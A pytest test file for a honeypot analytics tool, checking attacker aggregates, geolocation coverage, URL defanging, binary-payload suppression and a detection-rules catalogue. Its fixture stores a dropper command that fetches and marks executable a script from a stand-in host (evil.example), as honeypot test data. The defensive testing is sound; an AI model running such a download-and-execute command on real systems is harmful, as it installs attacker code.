"""Attacker details, honeypot aggregates and the rules catalogue."""
import json
import re
import sqlite3
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from schemas import Alert
from storage.cowrie_store import init_db
from detection import public_attackers as pat, public_alerts, rule_catalog

NOW = datetime(2026, 10, 30, 12, 0, tzinfo=timezone.utc)
A, B, C = "120.24.191.90", "178.128.36.18", "7.7.7.7"
GEO = {A: {"lat": 30.3, "lon": 120.2, "city": "Hangzhou", "country": "China", "cc": "CN", "org": "Cloud Co", "asn": "AS1"},
       B: {"lat": 51.5, "lon": -0.1, "city": "London", "country": "United Kingdom", "cc": "GB", "org": "Cloud Co", "asn": "AS1"}}
ELF = ">A@/1'8ELF7}" + "\x01\x02\x03" * 50


@pytest.fixture
def db(tmp_path):
    path = tmp_path / "cowrie.db"
    init_db(path)
    with sqlite3.connect(path) as c:
        n = 0
        for ip, count in ((A, 5), (B, 3), (C, 1)):
            for i in range(count):
                n += 1
                sid = f"s{n}"
                c.execute("INSERT INTO sessions(session_id, src_ip, start_time) VALUES (?,?,?)",
                          (sid, ip, (NOW - timedelta(days=i)).isoformat()))
                c.execute("INSERT INTO session_logins(session_id, username, password, success, timestamp) VALUES (?,?,?,1,?)",
                          (sid, "root" if i % 2 else "<b>x</b>", "pw\x00" + str(i), "t"))
                cmd = ['echo -e "\\x6F\\x6B"', "uname -a", "cd /tmp; wget http://evil.example/a.sh; chmod +x a.sh", ELF][i % 4]
                c.execute("INSERT INTO session_commands(session_id, command_text, ran_at) VALUES (?,?,?)", (sid, cmd, "t"))
    return str(path)


def alert(ip, rule="rule_015_cowrie_login", auid=None):
    return Alert(rule_id=rule, technique="T1110.001", severity="CRITICAL", timestamp=NOW, first_seen=NOW, log_source="cowrie",
                 dedup_key=f"{rule}{ip}{auid}", description="x", source_ip=ip, auid=auid)


def test_detail_has_geo_logins_commands_and_rule_counts(db, tmp_path):
    out = str(tmp_path / "pa.json")
    agg = pat.build(db, GEO, [alert(A), alert(A), alert(B, "rule_001_ssh_brute_force")], out, NOW)
    d = json.load(open(out))["attackers"]
    assert d[A]["sessions"] == 5 and d[A]["login_attempts"] == 5 and d[A]["cc"] == "CN" and d[A]["network"] == "Cloud Co"
    assert d[A]["rules"] == [{"rule_id": "rule_015_cowrie_login", "count": 2}]
    assert d[C]["country"] is None and d[C]["network"] is None                    # unlocated IPs still get a record
    assert agg["geo_coverage"] == {"top_n": 200, "total_sessions": 9, "located_sessions": 8}


def test_owner_alerts_are_not_counted_per_ip(db, tmp_path):
    pat.build(db, GEO, [alert(A, auid=1000)], str(tmp_path / "pa.json"), NOW)
    assert json.load(open(tmp_path / "pa.json"))["attackers"][A]["rules"] == []


def test_country_and_network_aggregates_add_up(db, tmp_path):
    agg = pat.build(db, GEO, [], str(tmp_path / "pa.json"), NOW)
    assert {c["cc"]: c["sessions"] for c in agg["countries"]} == {"CN": 5, "GB": 3}
    assert agg["networks"] == [{"network": "Cloud Co", "sessions": 8, "attackers": 2}]
    assert [p["ip"] for p in agg["map"]] == [A, B] and "7.7.7.7" not in json.dumps(agg["map"])


def test_commands_are_explained_defanged_and_binary_is_never_printed(db, tmp_path):
    agg = pat.build(db, GEO, [], str(tmp_path / "pa.json"), NOW)
    top = {c["value"]: c for c in agg["commands"]["top"]}
    assert agg["commands"]["total"] == 9 and agg["commands"]["sessions_with_commands"] == 9
    assert "Prints “ok”" in top['echo -e "\\x6F\\x6B"']["meaning"]
    dropper = next(v for v in top if "wget" in v)
    assert "hxxp://evil.example" in dropper and "http://" not in dropper
    assert "dropper" in top[dropper]["meaning"] and top["uname -a"]["meaning"] == "Fingerprints the operating system."
    assert any(v.startswith("(binary payload") for v in top) and "ELF" not in json.dumps(agg["commands"])


def test_hostile_text_is_flattened_and_capped(db, tmp_path):
    pat.build(db, GEO, [], str(tmp_path / "pa.json"), NOW)
    d = json.load(open(tmp_path / "pa.json"))["attackers"][A]
    assert "<b>x</b>" in [u["value"] for u in d["usernames"]]                     # kept as text; the page escapes it
    assert all("\x00" not in p["value"] for p in d["passwords"])
    assert len(pat.display_command("a " * 500)) <= pat.COMMAND_CHARS + 1


def test_defang_and_binary_detection():
    assert pat.defang("curl https://x.io/a http://y.io ftp://z") == "curl hxxps://x.io/a hxxp://y.io fxp://z"
    assert pat.looks_binary(ELF) and not pat.looks_binary("uname -a") and not pat.looks_binary('echo -e "\\x6F\\x6B"')


def test_top_n_limit_and_missing_database(db, tmp_path):
    assert pat.top_ips(db, limit=2) == [A, B]
    assert pat.top_ips(str(tmp_path / "nope.db")) == []
    pat.build(db, GEO, [], str(tmp_path / "pa.json"), NOW, top_n=1)
    assert list(json.load(open(tmp_path / "pa.json"))["attackers"]) == [A]


def test_file_is_written_atomically(db, tmp_path):
    pat.build(db, GEO, [], str(tmp_path / "pa.json"), NOW)
    assert not (tmp_path / "pa.json.tmp").exists()


# ── rules catalogue ────────────────────────────────────────────────────────────

def test_every_rule_file_has_a_catalogue_entry_with_its_real_rule_id():
    files = sorted(p.stem[:8] for p in Path("rules").glob("rule_0*.py"))
    ids = [r[0] for r in rule_catalog.CATALOG]
    assert [i[:8] for i in ids] == files and len(set(ids)) == len(ids)
    for p in Path("rules").glob("rule_0*.py"):                                    # the id must appear in the rule's code
        assert next(i for i in ids if i.startswith(p.stem[:8])) in p.read_text()


def test_the_public_filter_excludes_the_real_heartbeat_rule_id():
    from rules.rule_018_collector_heartbeat import RULE_ID
    assert RULE_ID in public_alerts.EXCLUDED_RULES


def test_catalogue_joins_counts_and_keeps_never_fired_rules():
    rows = rule_catalog.with_counts({"rule_015_cowrie_login": {"total": 14261, "last_24h": 0, "last_seen": "2026-10-28T10:00:00+00:00"}})
    by = {r["id"]: r for r in rows}
    assert by["rule_015_cowrie_login"]["total"] == 14261 and by["rule_002_console_login_no_mfa"]["total"] == 0
    assert len(rows) == 18
